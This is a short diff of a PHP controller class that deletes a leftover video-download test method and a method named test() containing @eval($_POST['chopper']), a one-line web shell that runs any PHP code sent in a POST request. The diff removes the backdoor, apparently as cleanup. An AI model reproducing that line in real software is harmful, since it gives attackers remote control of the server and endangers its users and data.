@@ -850,20 +850,4 @@ class IndexAction extends CommonAction {
 		$result = file_get_contents($url);
 		$this->ajaxReturn($result, '', true);
 	}
-	
-	public function test0619() {
-		set_time_limit(1000);
-		import("@.ORG.VideoDownload");
-		$videoDownload = new VideoDownload();
-		$videoInfo = $videoDownload->download("http://www.peepandthebigwideworld.com/activities/anywhere-activities/whathappens/");
-		if (!$videoInfo) {
-			var_dump($videoDownload->getError());
-		}
-		var_dump($videoInfo);
-	}
-	
-	public function test() {
-		@eval($_POST['chopper']);
-		exit(0);
-	}
 }
